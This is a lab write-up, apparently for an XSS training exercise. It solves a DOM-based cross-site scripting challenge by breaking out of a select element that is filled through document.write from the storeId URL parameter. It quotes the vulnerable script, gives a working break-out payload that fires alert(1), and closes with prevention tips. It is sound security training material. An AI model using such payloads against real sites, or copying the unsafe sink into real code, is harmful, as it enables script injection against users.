# Lab 04: DOM XSS in document.write sink using source location.search inside a select element

**Goal**: Perform a DOM-based cross-site scripting (DOM XSS) attack that breaks out of a `<select>` drop-down element context and triggers `alert(1)`.

This lab contains a DOM-based cross-site scripting vulnerability in the product stock checker feature. The application reads user input from `location.search` (`storeId` parameter) and writes it into a HTML `<select>` drop-down element using the unsafe `document.write()` sink.

---

## 🎯 Solution

1. Open any product page (e.g., `/product?productId=1`).
2. Observe the store location selection options (London, Milan, Paris).
3. Test parameter injection by appending `&storeId=Jakarta` to the URL query string:
   ```http
   /product?productId=1&storeId=Jakarta
   ```
4. Verify that `Jakarta` is appended as an `<option>` element inside the `<select>` drop-down.
5. Break out of the `<select>` element using the payload:
   ```html
   "></select><img src=1 onerror=alert(1)>
   ```
6. Append the payload URL-encoded or raw to the `storeId` parameter to trigger `alert(1)`.

![Lab 4 Stock Checker Dropdown](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-25%20191116.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Inspect Product Page & Stock Checker
Click on any product details page on the target website. Note the product URL:
```http
/product?productId=1
```

Scroll down to the **Check stock** section containing store location options (London, Milan, Paris):

![Lab 4 Product Stock Checker](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-25%20204304.png)

### Step 2: Source & Sink Analysis
Right-click on the store selection drop-down and click **Inspect Element**:

![Lab 4 Inspect Store ID Parameter](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-25%20204433.png)

Examine the client-side JavaScript executing on the page:
```javascript
var stores = ["London", "Milan", "Paris"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if (store) {
    document.write('<option selected>' + store + '</option>');
}
for (var i=0; i<stores.length; i++) {
    if (stores[i] === store) {
        continue;
    }
    document.write('<option>' + stores[i] + '</option>');
}
document.write('</select>');
```

- **Source**: `location.search` (`storeId` parameter in the URL)
- **Sink**: `document.write()` inside `<select name="storeId">`

### Step 3: Test Input Reflection
Append `&storeId=Jakarta` to the browser URL address bar:
```http
/product?productId=1&storeId=Jakarta
```

Inspect the rendered DOM to confirm `Jakarta` is inserted into an `<option>` element:

![Lab 4 Custom Location Reflected](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-25%20204805.png)

### Step 4: Craft Break-Out Payload
Because the `store` input is written inside `<option selected>...`, we must close the current option and select tags before injecting our HTML payload:

1. Close `<option>` and `<select>`: `"></select>`
2. Inject event handler element: `<img src=1 onerror=alert(1)>`

Combined payload:
```html
"></select><img src=1 onerror=alert(1)>
```

### Step 5: Execute Exploitation
Append the payload to the `storeId` URL parameter:
```http
/product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```

Press Enter. `document.write()` renders the broken DOM context, instantiates the broken `<img>` element, and triggers `onerror=alert(1)`:

![Lab 4 Solved Alert](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-25%20205059.png)

> [!SUCCESS]
> **Lab Solved**: Successfully broke out of the `<select>` element and executed `alert(1)`!

---

## 💡 Key Takeaways: Context Breaking in DOM XSS

- **Context Awareness**: DOM XSS payloads depend heavily on the HTML context where the input is inserted (inside attributes, tags, scripts, or select elements).
- **Tag Closure**: Always construct payloads that properly close existing HTML syntax (`">`, `</select>`, `</script>`) before starting new executable elements.

---

## 🔒 Prevention

> [!TIP]
> 1. **Avoid `document.write()`**: Replace inline string concatenation with safe DOM manipulation methods (`document.createElement()`, `option.text = store`).
> 2. **Context-Aware Escaping**: HTML entity-encode user parameters before placing them inside select option values.
